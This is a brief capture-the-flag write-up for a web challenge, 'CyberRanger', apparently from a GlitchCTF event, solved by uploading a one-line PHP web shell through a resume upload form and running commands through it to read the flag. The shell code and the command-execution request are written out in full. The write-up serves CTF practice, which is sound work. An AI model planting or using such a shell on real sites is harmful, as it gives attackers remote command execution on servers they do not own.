
# Web: CyberRanger

Author: [some1hing](https://github.com/SOME-1HING/)
<br>

**Points**:  350
**Hint:**  In the realm where commands roam, what grants power to execute code from afar, unknown?

**Challenge description:**
```
The Cyber Rangers are back in town, on the hunt for a sysadmin once again. Submit your resume now.
```

## Solve

Upload a php shell like below:

**shell.php**
```php
<?php system($_GET['cmd']); ?>
```

returns a pseudo randomized file name where we can access the shell from.
```
File uploaded to: /uploads/65e724f422dfa.php 
```
use the file path to execute system commands!
```bash
http://glitchctf.games:64600/uploads/65e724f422dfa.php?cmd=whoami
------------------------------------------------------------------
www-data
```

Find the flag path and cat the flag.

#### Flag:
```plaintext
GLITCH{1_4M_B4tm4n}
```
